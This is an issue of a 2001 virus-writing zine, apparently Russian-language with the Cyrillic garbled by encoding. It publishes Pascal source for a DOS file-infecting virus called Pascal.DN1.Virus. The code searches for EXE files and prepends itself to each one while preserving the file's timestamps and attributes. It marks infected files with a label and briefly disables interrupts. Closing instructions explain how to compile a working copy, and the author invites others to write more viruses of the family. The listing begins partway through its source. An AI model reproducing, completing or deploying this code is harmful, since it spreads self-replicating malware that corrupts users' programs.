
                        =>POWER HEAP RESEARCH<=

      ﬁ€€› ‹€€€€€‹ ‹€€€€€€ ‹€€€€€€ ‹€€€€€‹ €€€€€€€ ‹€€€€€€ €€€€€€‹
       €€  €€   €€ €€‹‹‹‹  €€‹‹‹‹  €€        ﬁ€›   €€‹‹‹‹  €€   €€
       €€  €€   €€ €€ﬂﬂﬂﬂ  €€ﬂﬂﬂﬂ  €€        ﬁ€›   €€ﬂﬂﬂﬂ  €€   €€
      ﬁ€€› €€   €€ €€      ﬂ€€€€€€ ﬂ€€€€€ﬂ   ﬁ€›   ﬂ€€€€€€ €€€€€€ﬂ

              ‹€€€€€€       €€€€€€‹ €€   €€ €€€€€€‹ ‹€€€€€‹
              €€‹‹‹‹  ‹‹‹‹‹ €€‹‹‹€ﬂ €€   €€ €€   €€ €€  ‹‹‹
              €€ﬂﬂﬂﬂ  ﬂﬂﬂﬂﬂ €€ﬂﬂﬂ€€ €€   €€ €€€€€€  €€   €€
              ﬂ€€€€€€       €€€€€€ﬂ ﬂ€€€€€ﬂ €€  ﬂ€€ ﬂ€€€€€ﬂ

                          [Üyp≠†´ ¢®p¨•©™•pÆ¢]

 HÆ¨•p 5 ß† 2001
 ---------------

                                     "íÎ §y¨†•ËÏ - Ô ‚¢Æ© Øp®§†‚Æ™ ? H•‚.
                                      ü - Ì‚Æ Ô.
                                      . . . . . . . . . . . . . . . . . .
                                      å•≠Ô ØÆ·‚pÆ®´ Á•´Æ¢•™.   à ¢Æ‚ - 
                                      ë†¨ £Æ¢ÆpÓ Ô · Ì‚®¨ Á•´Æ¢•™Æ¨."

                                      Ñ¶Æ≠ ìÌ©≠ "ë‚®Â®, Øp®Ø®·Î¢†•¨Î•
                                                  Ì´•™‚pÆ≠≠Æ¨y ¨Æß£y"


                            Ç®py·Î ≠† Ø†·™†´•


 ë•¨•©·‚¢Æ Pascal.DN1.Virus

{$M 2048 , 0 , 0}
{$A-}
{$B-}
{$D-}
{$E+}
{$F-}
{$G-}
{$I-}
{$L-}
{$N-}
{$S-}
    SetFAttr(VirBody , Attr);

    Close(VirBody);

    SwapVectors;
      Exec(GetEnv('COMSPEC') , '/C ' + OurName + CmdLine);
    SwapVectors;

    Assign(VirBody , ParamStr(0));

    SetFAttr(VirBody , Archive);

    Reset(VirBody , 1);

    BlockWrite(VirBody , VirBuf , VirLen);

    Seek(VirBody , DirInfo.Size - VirLen - 5);

    BlockWrite(VirBody , TargetBuf , VirLen);

    Seek(Virbody , DirInfo.Size - 5);

    BlockWrite(VirBody , LabelBuf , 5);

    SetFTime(VirBody , Time);
    SetFAttr(VirBody , Attr);

    Close(VirBody);

 end;


 procedure FindTarget;

  Var
     Sr  :  SearchRec;

 function VirusPresent : Boolean;
  begin

     VirusPresent:=False;

     Assign(Target , TargetFile);
     Reset(Target , 1);

     Seek(Target , Sr.Size - 5);
     BlockRead(Target , VirIdentifier , 5);

     IF VirIdentifier = VirLabel THEN
      VirusPresent:=True;

 end;

 procedure InfectFile;
  begin

   If Sr.Size < VirLen * 2  Then Exit;

   IF NOT VirusPresent THEN
    begin

       Time:=Sr.Time;
       Attr:=Sr.Attr;

       Assign(Target , TargetFile);
       SetFAttr(Target, Archive);
       Reset(Target , 1);

       BlockRead(Target , TargetBuf , VirLen);

       Seek(Target , 0);
       BlockWrite(Target, VirBuf, VirLen);

       Seek(Target , Sr.Size);
       BlockWrite(Target , TargetBuf , VirLen);

       Seek(Target , Sr.Size + VirLen);

       BlockWrite(Target , LabelBuf , 5);

       SetFAttr(Target , Attr);
       SetFTime(Target , Time);

       Close(Target);

       Inc(InfFiles);

    end;
 end;

  begin

      FindFirst('*.EXE', Archive , Sr);
       While DosError = 0 Do
         begin

           If Sr.Name='' Then Exit;

           TargetFile:=Sr.Name;

           InfectFile;

           If InfFiles > InfCount Then Exit;

           FindNext(Sr);

         end;
  end;

 begin  { * é·≠Æ¢≠Æ• ‚•´Æ * }

     asm
         PUSH AX
         IN AL, 21h
         OR AL, 03h
         OUT 21h, AL
         POP AX
     end;

     Init;

     FindTarget;

     asm
         PUSH AX
         IN AL, 21h
         AND AL, 0FCh
         OUT 21h, AL
         POP AX
     end;

     ExecOriginal;

       IF False THEN
          begin
          left:=virname+' ';
          left:=author+' ';
          left:=virstring+' ';
          left:=hvg+' ';
          left:=phr+' ';

          (* †´£Æp®‚¨ ØÆ´ÏßÆ¢†‚•´Ô *)

          end;

 end.


 ä†™ ØÆ´yÁ®‚Ï p†°Æ‚Æ·ØÆ·Æ°≠yÓ ™ÆØ®Ó :


  1. ë™Æ¨Ø®´®pÆ¢†‚Ï ¢®py·;
  2. èÆ§Øp†¢®‚Ï Ø•p•¨•≠≠yÓ virlen ≠† §´®≠y ·™Æ¨Ø®´®pÆ¢†≠≠Æ£Æ ¢®py·†;
  3. ë™Æ¨Ø®´®pÆ¢†‚Ï •È• p†ß.

 Ü§•¨ Æ‚ Ç†· ≠Æ¢ÎÂ ¢®py·Æ¢ Ì‚Æ£Æ ·•¨•©·‚¢†.

                                              Helloween
